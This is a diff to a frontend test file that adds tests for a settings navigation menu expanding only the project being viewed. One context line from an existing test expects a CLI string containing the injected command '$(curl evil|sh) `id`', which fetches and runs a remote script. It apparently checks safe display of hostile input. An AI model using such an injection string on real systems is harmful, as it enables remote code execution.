@@ -397,3 +397,23 @@ describe("Settings › Account's CLI line", () => {
     expect(await screen.findByText("darkory login '$(curl evil|sh) `id`'")).toBeInTheDocument();
   });
 });
+
+describe("Settings › nav", () => {
+  it("unfolds only the Project being viewed: none on an Organisation page", async () => {
+    mockApi({ ...signedIn(), ...details });
+    renderApp("/settings/organisation/agents");
+    const nav = await screen.findByRole("navigation", { name: "Settings pages" });
+    const projects = within(nav).getByRole("list", { name: "Projects" });
+    await within(projects).findByRole("button", { name: "Web" });
+    expect(within(projects).getAllByRole("button").filter((b) => b.getAttribute("aria-expanded") === "true")).toEqual([]);
+    expect(within(nav).queryByRole("list", { name: "Web" })).not.toBeInTheDocument();
+  });
+
+  it("unfolds the Project whose page is open, and only it", async () => {
+    mockApi({ ...signedIn(), ...details });
+    renderApp("/settings/projects/OPS/general");
+    const nav = await screen.findByRole("navigation", { name: "Settings pages" });
+    expect(await within(nav).findByRole("button", { name: "Ops" })).toHaveAttribute("aria-expanded", "true");
+    expect(within(nav).getByRole("button", { name: "Web" })).toHaveAttribute("aria-expanded", "false");
+  });
+});
